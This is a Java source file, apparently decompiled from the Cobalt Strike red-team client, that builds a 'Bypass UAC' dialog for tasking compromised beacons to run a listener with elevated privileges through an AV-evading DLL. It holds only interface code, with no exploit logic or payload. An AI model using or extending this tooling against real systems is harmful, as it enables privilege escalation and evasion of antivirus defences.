package aggressor.dialogs;

import aggressor.AggressorClient;
import beacon.TaskBeacon;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import java.awt.event.ActionEvent;
import java.io.IOException;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class BypassUACDialog implements DialogListener {

    protected AggressorClient client;

    protected String[] bids;

    public BypassUACDialog(AggressorClient aggressorClient, String[] arrstring) {
        this.client = aggressorClient;
        this.bids = arrstring;
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        String str = DialogUtils.string(map, "listener");
        TaskBeacon taskBeacon = new TaskBeacon(this.client, this.bids);
        if (this.bids.length == 1)
            DialogUtils.openOrActivate(this.client, this.bids[0]);
        taskBeacon.input("bypassuac " + str);
        taskBeacon.BypassUAC(str);
    }

    public void show() throws IOException {
        JFrame jFrame = DialogUtils.dialog("Bypass UAC", 640, 480);
        DialogManager dialogManager = new DialogManager(jFrame);
        dialogManager.addDialogListener(this);
        dialogManager.sc_listener_all("listener", "Listener:", this.client);
        JButton jButton1 = dialogManager.action("Launch");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-bypassuac");
        jFrame.add(DialogUtils.description("Execute a listener in a high-integrity context. This feature uses Cobalt Strike's Artifact Kit to generate an AV-safe DLL."), "North");
        jFrame.add(dialogManager.layout(), "Center");
        jFrame.add(DialogUtils.center(jButton1, jButton2), "South");
        jFrame.pack();
        jFrame.setVisible(true);
    }
}
